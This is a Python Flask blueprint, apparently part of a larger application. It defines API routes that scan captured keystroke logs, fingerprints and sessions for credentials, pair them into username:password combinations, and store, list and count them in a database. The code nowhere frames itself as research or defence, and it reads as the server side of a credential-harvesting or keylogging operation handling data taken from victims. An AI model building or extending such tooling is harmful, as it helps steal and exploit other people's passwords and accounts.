"""credentials blueprint (P3 batch extract)."""
from __future__ import annotations

import os, json, base64
import uuid as uuid_module
from datetime import datetime, timedelta
from functools import wraps
from flask import (Blueprint, request, jsonify, redirect, url_for, render_template, send_from_directory, make_response, session, Response)
from app.state import *  # noqa: F401,F403  -- P3
from app.state import BASE_DIR, CONFIG, _decode_data_url, _save_mobile_capture
import database as db

from credential_parser import get_credential_stats, pair_credentials, scan_fingerprints, scan_keystroke_files, scan_sessions
bp = Blueprint("credentials", __name__,
               template_folder=os.path.join(BASE_DIR, "flask_templates"))


@bp.route('/api/credentials/scan', methods=['POST'])
def credentials_scan():
    """Trigger a credential scan across all captured data"""
    try:
        keystroke_creds = scan_keystroke_files()
        fingerprint_creds = scan_fingerprints()
        session_creds = scan_sessions()
        
        all_creds = keystroke_creds + fingerprint_creds + session_creds
        
        # Save to database
        saved = 0
        for cred in all_creds:
            result = db.save_credential(
                cred_type=cred['type'],
                value=cred['value'],
                source=cred.get('source', 'scan'),
                source_file=cred.get('file', ''),
                url=cred.get('url', ''),
                confidence=cred.get('confidence', 50),
            )
            if result:
                saved += 1
        
        # Also save pairs
        pairs = pair_credentials()
        for pair in pairs:
            db.save_credential(
                cred_type='credential_pair',
                value=f"{pair['username']}:{pair['password']}",
                source=pair.get('source', 'pairing'),
                source_file=pair.get('file', ''),
                url=pair.get('url', ''),
                confidence=80,
                paired_username=pair['username'],
                paired_password=pair['password'],
            )
        
        return jsonify({
            'status': 'scan_complete',
            'found': len(all_creds),
            'saved': saved,
            'pairs': len(pairs),
            'breakdown': get_credential_stats()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@bp.route('/api/credentials/list')
def credentials_list():
    """List all discovered credentials"""
    cred_type = request.args.get('type')
    creds = db.get_credentials(cred_type=cred_type)
    return jsonify({'credentials': creds})

@bp.route('/api/credentials/pairs')
def credentials_pairs():
    """Get paired username:password combinations"""
    pairs = db.get_credential_pairs()
    return jsonify({'pairs': pairs})

@bp.route('/api/credentials/stats')
def credentials_stats():
    """Get credential statistics"""
    all_creds = db.get_credentials()
    stats = {}
    for cred in all_creds:
        t = cred['cred_type']
        stats[t] = stats.get(t, 0) + 1
    return jsonify({'stats': stats, 'total': len(all_creds)})

@bp.route('/api/credentials/delete/<int:cred_id>', methods=['DELETE'])
def credentials_delete(cred_id):
    db.delete_credential(cred_id)
    return jsonify({'status': 'deleted'})
